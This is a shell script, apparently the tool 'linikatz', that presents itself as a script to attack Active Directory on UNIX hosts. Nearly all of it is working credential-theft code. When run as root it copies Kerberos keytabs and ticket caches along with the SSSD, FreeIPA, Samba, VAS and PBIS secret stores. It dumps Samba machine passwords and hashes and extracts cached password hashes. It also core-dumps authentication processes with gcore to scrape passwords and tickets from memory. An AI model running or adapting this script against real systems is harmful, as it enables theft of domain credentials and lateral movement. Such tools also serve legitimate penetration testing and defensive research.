#!/bin/bash
# Copyright (c) 2015-2021, Cisco International Ltd
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the Cisco International Ltd nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

header () {
	printf " _ _       _ _         _\n"
	printf "| (_)_ __ (_) | ____ _| |_ ____\n"
	printf "| | | '_ \| | |/ / _\` | __|_  /\n"
	printf "| | | | | | |   < (_| | |_ / /\n"
	printf "|_|_|_| |_|_|_|\_\__,_|\__/___|\n"
	printf "\n"
	printf "             =[ @timb_machine ]=\n"
	printf "\n"
}

version () {
	header
	preamble
	printf "Brought to you by:\n"
	printf "\n"
	cat doc/AUTHORS
	exit 1
}

preamble () {
	printf "Shell script to attack AD on UNIX\n"
}

usage () {
	header
	preamble
	printf "Usage: %s\n" "${0}"
	exit 1
}

stdio_message_log () {
	check="${1}"
	message="${2}"
	[ "$(validate_is_string "${check}")" -eq 1 ] || false
	[ "$(validate_is_string "${message}")" -eq 1 ] || false
	if [ "${VERBOSE}" -ge 1 ]
	then
		stdio_format_message "32" "I" "${check}" "${message}"
	fi
}

stdio_message_warn () {
	check="${1}"
	message="${2}"
	[ "$(validate_is_string "${check}")" -eq 1 ] || false
	[ "$(validate_is_string "${message}")" -eq 1 ] || false
	stdio_format_message "33" "W" "${check}" "${message}"
}

stdio_message_debug () {
	check="${1}"
	message="${2}"
	[ "$(validate_is_string "${check}")" -eq 1 ] || false
	[ "$(validate_is_string "${message}")" -eq 1 ] || false
	if [ "${VERBOSE}" -ge 2 ]
	then
		stdio_format_message "35" "D" "${check}" "${message}" >&2
	fi
}

stdio_message_error () {
	check="${1}"
	message="${2}"
	[ "$(validate_is_string "${check}")" -eq 1 ] || false
	[ "$(validate_is_string "${message}")" -eq 1 ] || false
	stdio_format_message "31" "E" "${check}" "${message}" >&2
}

stdio_format_message () {
	color="${1}"
	type="${2}"
	check="${3}"
	message="${4}"
	[ "$(validate_is_string "${type}")" -eq 1 ] || false
	[ "$(validate_is_string "${check}")" -eq 1 ] || false
	[ "$(validate_is_string "${message}")" -eq 1 ] || false
	[ "$(validate_is_number "${color}")" -eq 1 ] || false
	if [ "${COLORING}" -eq 1 ]
	then
		printf -- "\033[%sm%s: [%s] %s\033[m\n" "${color}" "${type}" "${check}" "${message}"
	else
		printf -- "%s: [%s] %s\n" "${type}" "${check}" "${message}"
	fi
}

validate_matches_regex () {
	value="${1}"
	regex="${2}"
	if [ -n "$(printf -- "%s" "${value}" | egrep -- "$regex")" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

validate_is_string () {
	value="${1}"
	if [ "$(validate_matches_regex "${value}" ".*")" -eq 1 ]
	then
		printf -- "1\n"
	else
		stdio_message_error "validate" "invalid string: ${value}"
		printf -- "0\n"
	fi
}

validate_is_number () {
	value="${1}"
	if [ "$(validate_matches_regex "${value}" "^[0-9]+$")" -eq 1 ]
	then
		printf -- "1\n"
	else
		stdio_message_error "validate" "invalid number: ${value}"
		printf -- "0\n"
	fi
}

validate_is_boolean () {
	value="${1}"
	if [ "$(validate_is_regex "${value}" "^[0-1]$")" -eq 1 ]
	then
		printf -- "1\n"
	else
		stdio_message_error "validate" "invalid boolean: ${value}"
		printf -- "0\n"
	fi
}

needs_root () {
	if [ "$(id -u)" == "0" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

file_list () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ "$(file_exists "${filename}")" -eq 1 ]
	then
		find "${filename}" -type f
	fi
}

file_exists () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ -e "${filename}" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

file_is_regular () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ -f "${filename}" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

file_is_executable () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ -x "${filename}" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

file_is_directory () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ -d "${filename}" ]
	then
		printf -- "1\n"
	else
		printf -- "0\n"
	fi
}

file_steal () {
	filename="${1}"
	[ "$(validate_is_string "${filename}")" -eq 1 ] || false
	if [ "$(file_exists "${filename}")" -eq 1 ]
	then
		ls -l "${filename}"
		directoryname="linikatz.$$"
		if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
		then
			mkdir "${directoryname}"
		fi
		stolenfilename="${directoryname}/$(printf -- "%s" "${filename}" | tr "/" "_").${RANDOM}"
		cp "${filename}" "${stolenfilename}"
	fi
}

process_list () {
	pattern="${1}"
	[ "$(validate_is_string "${pattern}")" -eq 1 ] || false
	ps -aeo ruser,rgroup,pid,ppid,args | egrep -v "PID" | egrep "${pattern}" | egrep -v "grep" | while read userid groupid processid parentid command arguments
	do
		printf -- "%s\n" "${processid}"
	done
}

process_dump () {
	processid="${1}"
	directoryname="linikatz.$$"
	[ "$(validate_is_number "${processid}")" -eq 1 ] || false
	if [ "$(file_is_directory "${directoryname}")" -ne 1 ]
	then
		mkdir "${directoryname}"
	fi
	dumpedfilename="${directoryname}/process.${RANDOM}"
	gcore -o "${dumpedfilename}" "${processid}" >/dev/null 2>&1
	printf -- "%s\n" "${dumpedfilename}.${processid}"
}

process_maps_by_library () {
	pattern="${1}"
	[ "$(validate_is_string "${pattern}")" -eq 1 ] || false
	egrep -- "${pattern}" /proc/[0-9]*/maps 2>/dev/null | cut -f 3 -d "/" | sort | uniq
}

config_steal () {
	for filename in "$@"
	do
		[ "$(validate_is_string "${filename}")" -eq 1 ] || false
		if [ "$(file_is_directory "${filename}")" -eq 1 ]
		then
			file_list "${filename}" | while read filename
			do
				file_steal "${filename}"
			done
		else
			if [ "$(file_is_regular "${filename}")" -eq 1 ]
			then
				file_steal "${filename}"
			fi
		fi
	done
}

COLORING="0"
VERBOSE="1"
while [ -n "${1}" ]
do
	case "${1}" in
		--help|-h)
			usage
			;;
		--version|-v|-V)
			version
			;;
		--color|-c|--colour)
			COLORING="1"
			;;
		--verbose)
			shift
			VERBOSE="${1}"
			;;
		
	esac
	shift
done
header
stdio_message_log "freeipa-check" "FreeIPA AD configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /run/ipa/ccaches /var/lib/dirsrv /etc/dirsrv /var/lib/softhsm /etc/pki /etc/ipa || stdio_message_warn "needs" "not running as root"
stdio_message_log "sss-check" "SSS AD configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/sss /etc/sssd || stdio_message_warn "needs" "not running as root"
stdio_message_log "vintella-check" "VAS AD configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /var/opt/quest /etc/opt/quest || stdio_message_warn "needs" "not running as root"
stdio_message_log "pbis-check" "PBIS AD configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/pbis /etc/pbis || stdio_message_warn "needs" "not running as root"
stdio_message_log "samba-check" "Samba configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /var/lib/samba /var/cache/samba /etc/samba || stdio_message_warn "needs" "not running as root"
stdio_message_log "kerberos-check" "Kerberos configuration"
[ "$(needs_root)" -eq 1 ] && config_steal /etc/krb5.conf /etc/krb5.keytab /tmp/krb5* || stdio_message_warn "needs" "not running as root"
stdio_message_log "samba-check" "Samba machine secrets"
if [ "$(needs_root)" -eq 1 ]
then
	file_list /var/lib/samba/private | while read filename
	do
		if [ "$(file_is_regular "${filename}")" -eq 1 ]
		then
			tdbdump "${filename}" | egrep -A 1 "_PASSWORD"
		fi
	done
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "samba-check" "Samba hashes"
if [ "$(needs_root)" -eq 1 ]
then
	if [ "$(file_is_regular /var/lib/samba/passdb.tdb)" -eq 1 ]
	then
		pdbedit -s /etc/samba/smb.conf -L -w
	fi
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "check" "Cached hashes"
if [ "$(needs_root)" -eq 1 ]
then
	if [ "$(file_is_directory /var/lib/sss)" -eq 1 ]
	then
		stdio_message_log "sss-check" "SSS hashes"
		for filename in /var/lib/sss/db/cache_*
		do
			if [ "$(file_is_regular "${filename}")" -eq 1 ]
			then
				tdbdump "${filename}" | egrep -A 1 "DN=NAME" | egrep "\\\$6\\\$" | sed -e "s/.*cachedPassword.*\\\$6\\\$/\\\$6\\\$/g" -e "s/\\\00lastCached.*//g" 
			fi
		done
	fi
	if [ "$(file_is_directory /var/opt/quest)" -eq 1 ]
	then
		stdio_message_log "vas-check" "VAS hashes"
		sqlite3 /var/opt/quest/vas/authcache/vas_auth.vdb "SELECT krb5pname, sha1hash, legacyHash FROM authcache"
	fi
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "check" "Machine Kerberos tickets"
if [ "$(needs_root)" -eq 1 ]
then
	if [ "$(file_is_directory /var/lib/sss)" -eq 1 ]
	then
		stdio_message_log "sss-check" "SSS ticket list"
		for filename in /var/lib/sss/db/ccache_*
		do
			if [ "$(file_is_regular "${filename}")" -eq 1 ]
			then
				/usr/bin/klist -c "${filename}" -e -d -f
			fi
		done
	fi
	if [ "$(file_is_directory /var/opt/quest)" -eq 1 ]
	then
		stdio_message_log "vas-check" "VAS ticket list"
		if [ "$(file_is_regular /etc/opt/quest/vas/host.keytab)" -eq 1 ]
		then
			/opt/quest/bin/ktutil --keytab=/etc/opt/quest/vas/host.keytab
		fi
	fi
	if [ "$(file_is_directory /var/lib/pbis)" -eq 1 ]
	then
		stdio_message_log "pbis-check" "PBIS ticket list"
		if [ "$(file_is_regular /etc/krb5.keytab)" -eq 1 ]
		then
			printf "read_kt /etc/krb5.keytab\nlist\nquit\n" | /opt/pbis/bin/ktutil
		fi
		for filename in /var/lib/pbis/krb5cc_lsass*
		do
			if [ "$(file_is_regular "${filename}")" -eq 1 ]
			then
				/opt/pbis/bin/klist -c "${filename}" -e -d -f
			fi
		done
	fi
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "kerberos-check" "User Kerberos tickets"
for filename in /tmp/krb5*
do
	if [ "$(file_is_regular "${filename}")" -eq 1 ]
	then
		if [ "$(file_is_regular /usr/bin/klist)" -eq 1 ]
		then
			/usr/bin/klist -c "${filename}" -e -d -f
		else
			if [ "$(file_is_regular /opt/quest/bin/klist)" -eq 1 ]
			then
				/opt/quest/bin/klist -c "${filename}" -v --hidden
			else
				if [ "$(file_is_regular /opt/pbis/bin/klist)" -eq 1 ]
				then
					/opt/pbis/bin/klist -c "${filename}" -e -d -f
				fi
			fi
		fi
	fi
done
stdio_message_log "check" "KCM Kerberos tickets"
if [ "$(needs_root)" -eq 1 ]
then
	if [ "$(file_is_directory /var/lib/sss)" -eq 1 ]
	then
		stdio_message_log "sss-check" "SSS KCM tickets"
		if [ "$(file_is_regular /var/lib/sss/secrets/secrets.ldb)" -eq 1 ]
		then
			# TODO check this actually works, I'm guessing based on https://github.com/mandiant/SSSDKCMExtractor/blob/master/SSSDKCMExtractor.py
			tdbdump /var/lib/sss/secrets/secrets.ldb | egrep -A 1 "secret"
			stdio_message_log "warn" "You'll need /var/lib/sss/secrets/.secrets.mkey to decrypt this"
		fi
	fi
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "memory-check" "In memory passwords, plain text or stored as a hash"
if [ "$(needs_root)" -eq 1 ]
then
	stdio_message_log "sss-check" "SSS processes"
	process_list "sss" | while read processid
	do
		stdio_message_log "sss-check" "Process dump (${processid})"
		process_dump "${processid}" | while read filename
		do
			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | egrep "MAPI|\\\$6\\\$" | sort | uniq
		done
	done
else
	stdio_message_warn "needs" "not running as root"
fi
if [ "$(needs_root)" -eq 1 ]
then
	stdio_message_log "vas-check" "VAS processes"
	process_list "vasd" | while read processid
	do
		stdio_message_log "check" "VAS process dump (${processid})"
		process_dump "${processid}" | while read filename
		do
			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
		done
	done
else
	stdio_message_warn "needs" "not running as root"
fi
if [ "$(needs_root)" -eq 1 ]
then
	stdio_message_log "pbis-check" "PBIS processes"
	process_list "lwsmd|lw-" | while read processid
	do
		stdio_message_log "check" "PBIS process dump (${processid})"
		process_dump "${processid}" | while read filename
		do
			[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
		done
	done
else
	stdio_message_warn "needs" "not running as root"
fi
stdio_message_log "memory-check" "In memory tickets"
if [ "$(needs_root)" -ne 1 ]
then
	stdio_message_warn "needs" "not running as root (affects efficiency)"
fi
process_maps_by_library libkrb5 | while read processid
do
	stdio_message_log "kerberos-check" "Kerberos process dump (${processid})"
	process_dump "${processid}" | while read filename
	do
		[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
	done
done
stdio_message_log "memory-check" "In memory trusts"
if [ "$(needs_root)" -ne 1 ]
then
	stdio_message_warn "needs" "not running as root (affects efficiency)"
fi
process_maps_by_library libldap | while read processid
do
	stdio_message_log "ldap-check" "LDAP process dump (${processid})"
	process_dump "${processid}" | while read filename
	do
		[ "$(file_is_regular "${filename}")" -eq 1 ] && strings "${filename}" | sort | uniq
	done
done
